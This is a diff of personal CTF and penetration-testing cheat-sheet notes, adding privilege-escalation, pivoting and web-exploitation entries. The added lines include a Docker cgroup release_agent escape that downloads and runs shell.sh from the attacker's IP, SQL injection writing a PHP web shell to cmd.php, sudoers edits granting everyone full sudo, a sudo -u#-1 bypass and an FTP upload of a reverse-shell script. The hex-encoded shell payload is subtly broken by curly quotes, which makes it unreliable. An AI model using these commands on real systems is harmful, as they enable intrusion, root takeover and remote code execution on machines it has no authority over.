@@ -8,7 +8,12 @@ https://gtfobins.github.io/
 - Windows 
 https://lolbas-project.github.io/
 https://misakikata.github.io/2019/10/Windows-Notes/
+- General
+https://book.hacktricks.xyz/
 
+
+Dont forget to play with top level module in python. Ex:
+__import__("os").system("ls")
 
 
 **Box Notes**
@@ -32,6 +37,8 @@ cat /etc/issue
 - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or
 - `chmod u+s /bin/bash` as root, bash -p, or 
 - `echo "[username] ALL=(ALL:ALL) ALL" >> /etc/sudoers;`
+- `echo "ALL ALL=(ALL:ALL) ALL" >> /etc/sudoers;` >> Kalo males lol
+
 and on and on and on
 
 11. linpeas linenum pspy name ur shits
@@ -45,10 +52,13 @@ and on and on and on
 17. rpcclient --user=[username] [target-ip] -W [forest name]
 18. Check cdata
 19. Port 11211 is memcached server >>> https://www.hackingarticles.in/penetration-testing-on-memcached-server/
-20. Always check `netstat -tulpn`
+20. Always check `netstat -tulpn` or `ss -tulpn` and `ps aux`
+- Forward the unusual service and check it like 445 SMB or HTTP or FTP service.
 21. Enum smtp with telnet.
 22. On windows, always check `whoami /priv` and find recent vulnerability.
 23. Always check .git, and dont forget to use gitdumper.
+24. Keep an eye for exposed docker API port 2375 or 2376
+25. No gcc? search for cc
 
 
  
@@ -59,12 +69,20 @@ Example to encrypt:
 2. gpg --recipient [user will be recieving] --encrypt [file_name]
 3. The output shouldbe [file_name].gpg
 Example to decrypt:
+1. gpg --import [private_key]
+2. gpg [file_name]
+or
 1. gpg --decrypt [file_name]
-
 
 
 **CVE-2019-13287**
 (ALL, !root) /bin/bash >>> sudo -u#-1 /bin/bash
+
+
+
+**OpenSSL**
+1. Decrypt RSA
+openssl id_rsa -in=id_rsa
 
 
 
@@ -110,7 +128,7 @@ https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubu
 
 
 **Chisel**
-Essentially port forwarding.
+Essentially port forwarding services (http, ftp, smb, dll).
 - If there's an attempt to SSH or something outside the docker container we are in and we cant access it. We need to socks proxy stuff it somehow.
 - If we are trapped inside a docker container.
 
@@ -123,7 +141,7 @@ On our machine:
 On the target Machine:
 2. Transfer the chisel client
 3. chmod +x chisel
-4. ./chisel client [Our IP]:[Our Port] R:[The IP we want to proxy]:[The Service port we want to proxy]
+4. ./chisel client [Our IP]:[Our Port] R:[The port you going to access from your server (Anything)]:[The IP we want to proxy]:[The Service port we want to proxy]
 R:<local-interface>:<local-port>:<remote-host>:<remote-port>/<protocol>
 IF error, or stuff, just remove the local interface
 5. ss -ltn | grep -i [service port], if the service port available, you have succeed.
@@ -132,10 +150,18 @@ Ex: http://10.8.102.36:8080/ >> Our ip and the service port we want to proxy
 
 
 
+**PortForward**
+If you already have access to the target SSH server.
+1. `sudo ssh -L [service_port]:localhost:[service_port] [user]@[target_ip]`
+Example:
+- Portforwarding SMB: `sudo ssh -L 445:localhost:445 yanto@69.69.69.69 -i id_rsa`
+
+
+
 **Socat**
 - If there's specific service open like SSH or something, but portforwarding it doesnt work. You need to fork it.
 - Example case is like SSH service running locally.
-- Use netstat to check the service running.
+- Use netstat or ss -tulpn to check the service running.
 - With socat its like you are opening the service on the different port. (Like, previously not open SSH service [only run locally], you open it but on another port)
 - check `/etc/ssh/sshd_config` for the SSH details.
 
@@ -276,6 +302,23 @@ to delete it
 sudo userdel -r [username]
 ```
 5. sudo su to the user and now you can access it. 
+===
+IMPORTANT NOTES
+1. When you do this 
+`sudo mount -t nfs <remote-ip>:<shared_directory> /mnt/[name_of_the_mount]` or 
+`sudo mount <remote-ip>:[shared_directory] /mnt/[name_of_the_mount]` (Its the same btw)
+
+IF YOU GET AN ERROR, LIKE THIS:
+
+`mount.nfs: requested NFS version or transport protocol is not supported`
+
+TRY TO CHANGE THE SHARED DIRECTORY TO / 
+example: localhost:/
+
+2. WHY? It's on the Redhat documentation I forgot where. I spent like 6 hours researching to fix this error, and the fix is just simply change the shared directory part to /.
+
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+You can use that for privilege escalation as shown in this link.
 
 
 
@@ -288,6 +331,15 @@ You can even upload file to the target!
 ex for uploading file to FTP service:
 1. curl 'ftp://[username]:[password]@[target_ip]/files/' -v -P - -T  rev.sh
 
+
+
+**GIT**
+Usual git command for CTF
+1. git checkout .
+2. git revert []
+3. git log
+4. git show [] or git diff [] or else to see commit
+5. just man git tbh
 
 
 **Impacket**
@@ -342,7 +394,7 @@ cat >>> can
 https://aem1k.com/aurebesh.js/#%3Cscript%3Eak
 
 3. ..
-
+4. U can use this to bypass filter https://www.web2generators.com/html-based-tools/online-html-entities-encoder-and-decoder
 
 
 **Little SQLI**
@@ -352,8 +404,14 @@ https://aem1k.com/aurebesh.js/#%3Cscript%3Eak
 4. 'UNION SELECT group_concat(column_name),group_concat(table_name),3,4 from information_schema.columns WHERE table_schema='[db_name]'-- -
 
 IF the setting allowed, we can write file
-1. `' UNION SELECT 1,'<?php system($_GET['cmd']);?>' INTO OUTFILE '/var/www/html/cmd.php' -- -`
-2. `<original_value>' '<?php system($_GET['cmd']);?>' INTO OUTFILE '/var/www/html/cmd.php' -- -`
+Usually We hex encode the payload
+
+<?php system($_GET[‘cmd’]); ?>
+to
+0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d
+
+1. `' UNION SELECT 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d INTO OUTFILE '/var/www/html/cmd.php' -- -`
+2. `<original_value>' 0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d INTO OUTFILE '/var/www/html/cmd.php' -- -`
 
 IF None work
 1. <original_value>' INTO OUTFILE '/var/www/html/cmd.php' LINES TERMINATED BY [Any,terminator, usually the hex encoded RCE code] -- -
@@ -483,6 +541,28 @@ Charset (-f)
 - crunch 2 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -o ww.txt
 
 
+**Instant Docker Escape**
+Create a reverse shell.sh
+Open a netcat listener to get connection from shell.sh and a python server ofc
+
+On the docker machine
+1. mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+2. echo 1 > /tmp/cgrp/x/notify_on_release
+3. host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+4. echo "$host_path/cmd" > /tmp/cgrp/release_agent
+5. echo '#!/bin/sh' > /cmd
+6. echo 'curl [yourIP]:8000/shell.sh -o /dev/shm/shell.sh' >> /cmd
+7. echo 'chmod +x /dev/shm/shell.sh' >> /cmd
+8. echo 'sh /dev/shm/shell.sh' >> /cmd
+9. chmod a+x /cmd
+10. sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+===========
+
+1. You can use the gtfo bins one also to create alpine
+2. Or just use some weird misconfiguration on the system.
+
+
 **Random**
 1. hashcat --example-hash >> or just visit the one in the web
 <hash>:<salt>
@@ -518,6 +598,7 @@ e = 23
 d = 61527
 n = 37627
 ```
+13. Colorful RGB image squares? PIET 
 
 
 **OSINT**
@@ -540,4 +621,7 @@ i prefer just c
 `ssh -t [username]@[ip] /bin/sh`
 3. Automatc meterpreter persistance
 https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/
-4. PYTHONENV is the python environment variable, SO IF WE CHANGE IT THE IMPORT LOCATION ALSO CHANGES
+4. PYTHONPATH or PYTHONENV is the python environment variable, SO IF WE CHANGE IT THE IMPORT LOCATION ALSO CHANGES
+5. Statically linked binary is OP. U can use for example statically linked nmap to scan internal network to Pivot to other network. Useful when you are trapped inside a docker and tools are very limited.
+6. Bypass 403 with 403 fuzzer.
+7. File inside a folder but we dont own it and have no permission to write or edit it? If it's inside folder that we owned (example our home folder) we can, delete it. If there's a cronjob, we can just delete it and create malicious file with the same name.
